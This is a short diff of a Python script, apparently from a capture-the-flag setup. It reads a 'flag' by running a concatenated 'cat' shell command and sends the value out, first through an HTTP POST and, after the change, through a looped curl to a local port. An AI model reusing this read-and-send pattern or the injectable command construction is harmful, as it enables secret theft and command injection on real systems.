@@ -21,9 +21,9 @@ def main():
 	cmd = "cat " + var + output
 #	print cmd
 	flag = os.popen(cmd).read()
-	print flag	
-	r  = requests.post(url, data=flag)
-	print(r.text)
+
+	#test
+	os.system('curl http://127.0.0.1:10000/%s'%flag)
 
 
 '''To do thoughts '''
@@ -37,5 +37,4 @@ if __name__ == "__main__":
 		main()
 		time.sleep(5)
     	
-
 
